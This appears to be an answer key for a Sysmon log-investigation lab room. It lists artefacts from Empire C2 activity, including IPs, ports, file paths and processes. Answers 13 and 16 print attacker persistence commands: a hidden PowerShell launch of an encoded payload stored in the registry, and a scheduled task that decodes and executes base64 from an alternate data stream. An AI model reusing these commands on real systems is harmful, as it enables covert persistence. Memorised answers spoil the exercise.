<h1> Sysmon </h1>

<h3> Task 4  Cutting out the Noise </h3>
  ANSWER 1:	73,591 <br/>
  ANSWER 2: 2021-01-06 01:35:50.464 <br/>

<h3> Task 10  Practical Investigations </h3>
  ANSWER 1:	HKLM\System\CurrentControlSet\Enum\WpdBusEnumRoot\UMB\2&37c186b&0&STORAGE#VOLUME#_??_USBSTOR#DISK&VEN_SANDISK&PROD_U3_CRUZER_MICRO&REV_8.01#4054910EF19005B3&0#\FriendlyName<br/>
  ANSWER 2: \Device\HarddiskVolume3 <br/>
  ANSWER 3: rundll32.exe <br/>
  ANSWER 4: C:\Users\IEUser\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\S97WTYG7\update.hta <br/>
  ANSWER 5: C:\Users\IEUser\Downloads\update.html <br/>
  ANSWER 6: C:\Windows\System32\mshta.exe <br/>
  ANSWER 7: 10.0.2.18 <br/>
  ANSWER 8: 4443 <br/>
  ANSWER 9: 172.30.1.253 <br/>
  ANSWER 10: DESKTOP-O153T4R <br/>
  ANSWER 11: empirec2 <br/> 
  ANSWER 12: HKLM\SOFTWARE\Microsoft\Network\debug <br/> 
  ANSWER 13: “C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe” -c “$x=$((gp HKLM:Software\Microsoft\Network debug).debug);start -Win Hidden -A \”-enc $x\” powershell”;exit; <br/> 
  ANSWER 14: 172.168.103.188 <br/> 
  ANSWER 15: c:\users\q\AppData:blah.txt <br/> 
  ANSWER 16: “C:\WINDOWS\system32\schtasks.exe” /Create /F /SC DAILY /ST 09:00 /TN Updater /TR “C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \”IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($(cmd /c ‘’more &lt; c:\users\q\AppData:blah.txt’’’))))\”” <br/> 
  ANSWER 17: lsass.exe <br/> 
  ANSWER 18: 172.30.1.253 <br/> 
  ANSWER 19: 80 <br/> 
  ANSWER 20: Empire <br/> 
  
